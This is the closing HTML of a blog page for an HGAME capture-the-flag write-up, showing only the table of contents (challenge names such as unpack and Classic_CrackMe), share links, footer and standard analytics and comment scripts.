href="#%E5%A3%81%E7%BA%B8"><span class="toc-number">1.5.2.</span> <span class="toc-text">壁纸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98ProPlus"><span class="toc-number">1.5.3.</span> <span class="toc-text">签到题ProPlus</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2"><span class="toc-number">2.</span> <span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RE-1"><span class="toc-number">2.1.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unpack"><span class="toc-number">2.1.1.</span> <span class="toc-text">unpack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Classic-CrackMe"><span class="toc-number">2.1.2.</span> <span class="toc-text">Classic_CrackMe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyPy"><span class="toc-number">2.1.3.</span> <span class="toc-text">babyPy</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.rycbar.club/2020/01/25/hgame-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&text=hgame_wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&is_video=false&description=hgame_wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=hgame_wp&body=Check out this article: http://blog.rycbar.club/2020/01/25/hgame-wp/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&name=hgame_wp&description=&lt;p&gt;记录一下Hgame的部分题解和一些解题时的思路&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.rycbar.club/2020/01/25/hgame-wp/&t=hgame_wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2021
    Aorui Zhang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/atom.xml">RSS</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-128484503-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-128484503-1');
    </script>

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'rrblog-2';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
